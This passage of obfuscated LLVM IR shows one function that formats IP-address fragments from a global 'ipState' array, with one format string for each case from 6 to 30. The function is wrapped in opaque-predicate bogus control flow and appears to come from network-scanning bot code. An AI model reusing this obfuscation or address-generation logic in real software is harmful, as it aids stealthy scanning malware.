originalBB18:                                     ; preds = %originalBB18alteredBB, %149
  %158 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %160 = zext i8 %159 to i32
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %162 = zext i8 %161 to i32
  %163 = call i32 (i8*, i8*, ...) @szprintf(i8* %158, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.531, i32 0, i32 0), i32 %160, i32 %162)
  %164 = load i32, i32* @x.61
  %165 = load i32, i32* @y.62
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %172

; <label>:172:                                    ; preds = %originalBBpart220, %146
  %173 = load i32, i32* %1, align 4
  %174 = icmp eq i32 %173, 6
  br i1 %174, label %175, label %198

; <label>:175:                                    ; preds = %172
  %176 = load i32, i32* @x.61
  %177 = load i32, i32* @y.62
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %175
  %184 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %186 = zext i8 %185 to i32
  %187 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %188 = zext i8 %187 to i32
  %189 = call i32 (i8*, i8*, ...) @szprintf(i8* %184, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.532, i32 0, i32 0), i32 %186, i32 %188)
  %190 = load i32, i32* @x.61
  %191 = load i32, i32* @y.62
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %198

; <label>:198:                                    ; preds = %originalBBpart224, %172
  %199 = load i32, i32* %1, align 4
  %200 = icmp eq i32 %199, 7
  br i1 %200, label %201, label %208

; <label>:201:                                    ; preds = %198
  %202 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %204 = zext i8 %203 to i32
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %206 = zext i8 %205 to i32
  %207 = call i32 (i8*, i8*, ...) @szprintf(i8* %202, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.533, i32 0, i32 0), i32 %204, i32 %206)
  br label %208

; <label>:208:                                    ; preds = %201, %198
  %209 = load i32, i32* %1, align 4
  %210 = icmp eq i32 %209, 8
  br i1 %210, label %211, label %218

; <label>:211:                                    ; preds = %208
  %212 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %214 = zext i8 %213 to i32
  %215 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %216 = zext i8 %215 to i32
  %217 = call i32 (i8*, i8*, ...) @szprintf(i8* %212, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.526, i32 0, i32 0), i32 %214, i32 %216)
  br label %218

; <label>:218:                                    ; preds = %211, %208
  %219 = load i32, i32* @x.61
  %220 = load i32, i32* @y.62
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %218
  %227 = load i32, i32* %1, align 4
  %228 = icmp eq i32 %227, 9
  %229 = load i32, i32* @x.61
  %230 = load i32, i32* @y.62
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %228, label %237, label %244

; <label>:237:                                    ; preds = %originalBBpart228
  %238 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %239 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %240 = zext i8 %239 to i32
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %242 = zext i8 %241 to i32
  %243 = call i32 (i8*, i8*, ...) @szprintf(i8* %238, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.534, i32 0, i32 0), i32 %240, i32 %242)
  br label %244

; <label>:244:                                    ; preds = %237, %originalBBpart228
  %245 = load i32, i32* %1, align 4
  %246 = icmp eq i32 %245, 10
  br i1 %246, label %247, label %254

; <label>:247:                                    ; preds = %244
  %248 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %249 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %250 = zext i8 %249 to i32
  %251 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %252 = zext i8 %251 to i32
  %253 = call i32 (i8*, i8*, ...) @szprintf(i8* %248, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.535, i32 0, i32 0), i32 %250, i32 %252)
  br label %254

; <label>:254:                                    ; preds = %247, %244
  %255 = load i32, i32* %1, align 4
  %256 = icmp eq i32 %255, 11
  br i1 %256, label %257, label %280

; <label>:257:                                    ; preds = %254
  %258 = load i32, i32* @x.61
  %259 = load i32, i32* @y.62
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %257
  %266 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %267 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %268 = zext i8 %267 to i32
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %270 = zext i8 %269 to i32
  %271 = call i32 (i8*, i8*, ...) @szprintf(i8* %266, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.536, i32 0, i32 0), i32 %268, i32 %270)
  %272 = load i32, i32* @x.61
  %273 = load i32, i32* @y.62
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %280

; <label>:280:                                    ; preds = %originalBBpart232, %254
  %281 = load i32, i32* %1, align 4
  %282 = icmp eq i32 %281, 12
  br i1 %282, label %283, label %306

; <label>:283:                                    ; preds = %280
  %284 = load i32, i32* @x.61
  %285 = load i32, i32* @y.62
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %283
  %292 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %294 = zext i8 %293 to i32
  %295 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %296 = zext i8 %295 to i32
  %297 = call i32 (i8*, i8*, ...) @szprintf(i8* %292, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.537, i32 0, i32 0), i32 %294, i32 %296)
  %298 = load i32, i32* @x.61
  %299 = load i32, i32* @y.62
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %306

; <label>:306:                                    ; preds = %originalBBpart236, %280
  %307 = load i32, i32* @x.61
  %308 = load i32, i32* @y.62
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %306
  %315 = load i32, i32* %1, align 4
  %316 = icmp eq i32 %315, 13
  %317 = load i32, i32* @x.61
  %318 = load i32, i32* @y.62
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %316, label %325, label %332

; <label>:325:                                    ; preds = %originalBBpart240
  %326 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %327 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %328 = zext i8 %327 to i32
  %329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %330 = zext i8 %329 to i32
  %331 = call i32 (i8*, i8*, ...) @szprintf(i8* %326, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.538, i32 0, i32 0), i32 %328, i32 %330)
  br label %332

; <label>:332:                                    ; preds = %325, %originalBBpart240
  %333 = load i32, i32* %1, align 4
  %334 = icmp eq i32 %333, 14
  br i1 %334, label %335, label %342

; <label>:335:                                    ; preds = %332
  %336 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %337 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %338 = zext i8 %337 to i32
  %339 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %340 = zext i8 %339 to i32
  %341 = call i32 (i8*, i8*, ...) @szprintf(i8* %336, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.539, i32 0, i32 0), i32 %338, i32 %340)
  br label %342

; <label>:342:                                    ; preds = %335, %332
  %343 = load i32, i32* @x.61
  %344 = load i32, i32* @y.62
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %342
  %351 = load i32, i32* %1, align 4
  %352 = icmp eq i32 %351, 15
  %353 = load i32, i32* @x.61
  %354 = load i32, i32* @y.62
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %352, label %361, label %384

; <label>:361:                                    ; preds = %originalBBpart244
  %362 = load i32, i32* @x.61
  %363 = load i32, i32* @y.62
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %361
  %370 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %372 = zext i8 %371 to i32
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %374 = zext i8 %373 to i32
  %375 = call i32 (i8*, i8*, ...) @szprintf(i8* %370, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.540, i32 0, i32 0), i32 %372, i32 %374)
  %376 = load i32, i32* @x.61
  %377 = load i32, i32* @y.62
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %384

; <label>:384:                                    ; preds = %originalBBpart248, %originalBBpart244
  %385 = load i32, i32* %1, align 4
  %386 = icmp eq i32 %385, 16
  br i1 %386, label %387, label %394

; <label>:387:                                    ; preds = %384
  %388 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %390 = zext i8 %389 to i32
  %391 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %392 = zext i8 %391 to i32
  %393 = call i32 (i8*, i8*, ...) @szprintf(i8* %388, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.541, i32 0, i32 0), i32 %390, i32 %392)
  br label %394

; <label>:394:                                    ; preds = %387, %384
  %395 = load i32, i32* %1, align 4
  %396 = icmp eq i32 %395, 17
  br i1 %396, label %397, label %404

; <label>:397:                                    ; preds = %394
  %398 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %399 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %400 = zext i8 %399 to i32
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %402 = zext i8 %401 to i32
  %403 = call i32 (i8*, i8*, ...) @szprintf(i8* %398, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.542, i32 0, i32 0), i32 %400, i32 %402)
  br label %404

; <label>:404:                                    ; preds = %397, %394
  %405 = load i32, i32* @x.61
  %406 = load i32, i32* @y.62
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %404
  %413 = load i32, i32* %1, align 4
  %414 = icmp eq i32 %413, 18
  %415 = load i32, i32* @x.61
  %416 = load i32, i32* @y.62
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %414, label %423, label %430

; <label>:423:                                    ; preds = %originalBBpart252
  %424 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %426 = zext i8 %425 to i32
  %427 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %428 = zext i8 %427 to i32
  %429 = call i32 (i8*, i8*, ...) @szprintf(i8* %424, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.543, i32 0, i32 0), i32 %426, i32 %428)
  br label %430

; <label>:430:                                    ; preds = %423, %originalBBpart252
  %431 = load i32, i32* @x.61
  %432 = load i32, i32* @y.62
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %430
  %439 = load i32, i32* %1, align 4
  %440 = icmp eq i32 %439, 19
  %441 = load i32, i32* @x.61
  %442 = load i32, i32* @y.62
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %440, label %449, label %456

; <label>:449:                                    ; preds = %originalBBpart256
  %450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %452 = zext i8 %451 to i32
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %454 = zext i8 %453 to i32
  %455 = call i32 (i8*, i8*, ...) @szprintf(i8* %450, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.544, i32 0, i32 0), i32 %452, i32 %454)
  br label %456

; <label>:456:                                    ; preds = %449, %originalBBpart256
  %457 = load i32, i32* %1, align 4
  %458 = icmp eq i32 %457, 20
  br i1 %458, label %459, label %466

; <label>:459:                                    ; preds = %456
  %460 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %462 = zext i8 %461 to i32
  %463 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %464 = zext i8 %463 to i32
  %465 = call i32 (i8*, i8*, ...) @szprintf(i8* %460, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i32 0, i32 0), i32 %462, i32 %464)
  br label %466

; <label>:466:                                    ; preds = %459, %456
  %467 = load i32, i32* @x.61
  %468 = load i32, i32* @y.62
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %466
  %475 = load i32, i32* %1, align 4
  %476 = icmp eq i32 %475, 21
  %477 = load i32, i32* @x.61
  %478 = load i32, i32* @y.62
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %476, label %485, label %508

; <label>:485:                                    ; preds = %originalBBpart260
  %486 = load i32, i32* @x.61
  %487 = load i32, i32* @y.62
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %485
  %494 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %495 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %496 = zext i8 %495 to i32
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %498 = zext i8 %497 to i32
  %499 = call i32 (i8*, i8*, ...) @szprintf(i8* %494, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.546, i32 0, i32 0), i32 %496, i32 %498)
  %500 = load i32, i32* @x.61
  %501 = load i32, i32* @y.62
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %508

; <label>:508:                                    ; preds = %originalBBpart264, %originalBBpart260
  %509 = load i32, i32* %1, align 4
  %510 = icmp eq i32 %509, 22
  br i1 %510, label %511, label %518

; <label>:511:                                    ; preds = %508
  %512 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %514 = zext i8 %513 to i32
  %515 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %516 = zext i8 %515 to i32
  %517 = call i32 (i8*, i8*, ...) @szprintf(i8* %512, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.547, i32 0, i32 0), i32 %514, i32 %516)
  br label %518

; <label>:518:                                    ; preds = %511, %508
  %519 = load i32, i32* %1, align 4
  %520 = icmp eq i32 %519, 23
  br i1 %520, label %521, label %528

; <label>:521:                                    ; preds = %518
  %522 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %524 = zext i8 %523 to i32
  %525 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %526 = zext i8 %525 to i32
  %527 = call i32 (i8*, i8*, ...) @szprintf(i8* %522, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.548, i32 0, i32 0), i32 %524, i32 %526)
  br label %528

; <label>:528:                                    ; preds = %521, %518
  %529 = load i32, i32* %1, align 4
  %530 = icmp eq i32 %529, 24
  br i1 %530, label %531, label %538

; <label>:531:                                    ; preds = %528
  %532 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %534 = zext i8 %533 to i32
  %535 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %536 = zext i8 %535 to i32
  %537 = call i32 (i8*, i8*, ...) @szprintf(i8* %532, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0), i32 %534, i32 %536)
  br label %538

; <label>:538:                                    ; preds = %531, %528
  %539 = load i32, i32* %1, align 4
  %540 = icmp eq i32 %539, 25
  br i1 %540, label %541, label %548

; <label>:541:                                    ; preds = %538
  %542 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %544 = zext i8 %543 to i32
  %545 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %546 = zext i8 %545 to i32
  %547 = call i32 (i8*, i8*, ...) @szprintf(i8* %542, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.550, i32 0, i32 0), i32 %544, i32 %546)
  br label %548

; <label>:548:                                    ; preds = %541, %538
  %549 = load i32, i32* %1, align 4
  %550 = icmp eq i32 %549, 26
  br i1 %550, label %551, label %558

; <label>:551:                                    ; preds = %548
  %552 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %554 = zext i8 %553 to i32
  %555 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %556 = zext i8 %555 to i32
  %557 = call i32 (i8*, i8*, ...) @szprintf(i8* %552, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.551, i32 0, i32 0), i32 %554, i32 %556)
  br label %558

; <label>:558:                                    ; preds = %551, %548
  %559 = load i32, i32* @x.61
  %560 = load i32, i32* @y.62
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %558
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 27
  %569 = load i32, i32* @x.61
  %570 = load i32, i32* @y.62
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %568, label %577, label %600

; <label>:577:                                    ; preds = %originalBBpart268
  %578 = load i32, i32* @x.61
  %579 = load i32, i32* @y.62
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %577
  %586 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %587 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %588 = zext i8 %587 to i32
  %589 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %590 = zext i8 %589 to i32
  %591 = call i32 (i8*, i8*, ...) @szprintf(i8* %586, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.552, i32 0, i32 0), i32 %588, i32 %590)
  %592 = load i32, i32* @x.61
  %593 = load i32, i32* @y.62
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %600

; <label>:600:                                    ; preds = %originalBBpart272, %originalBBpart268
  %601 = load i32, i32* %1, align 4
  %602 = icmp eq i32 %601, 28
  br i1 %602, label %603, label %610

; <label>:603:                                    ; preds = %600
  %604 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %605 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %606 = zext i8 %605 to i32
  %607 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %608 = zext i8 %607 to i32
  %609 = call i32 (i8*, i8*, ...) @szprintf(i8* %604, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.553, i32 0, i32 0), i32 %606, i32 %608)
  br label %610

; <label>:610:                                    ; preds = %603, %600
  %611 = load i32, i32* %1, align 4
  %612 = icmp eq i32 %611, 29
  br i1 %612, label %613, label %620

; <label>:613:                                    ; preds = %610
  %614 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %615 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %616 = zext i8 %615 to i32
  %617 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %618 = zext i8 %617 to i32
  %619 = call i32 (i8*, i8*, ...) @szprintf(i8* %614, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.554, i32 0, i32 0), i32 %616, i32 %618)
  br label %620

; <label>:620:                                    ; preds = %613, %610
  %621 = load i32, i32* %1, align 4
  %622 = icmp eq i32 %621, 30
  br i1 %622, label %623, label %630

; <label>:623:                                    ; preds = %620
  %624 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %625 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %626 = zext i8 %625 to i32
  %627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %628 = zext i8 %627 to i32
  %629 = call i32 (i8*, i8*, ...) @szprintf(i8* %624, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.555, i32 0, i32 0), i32 %626, i32 %628)
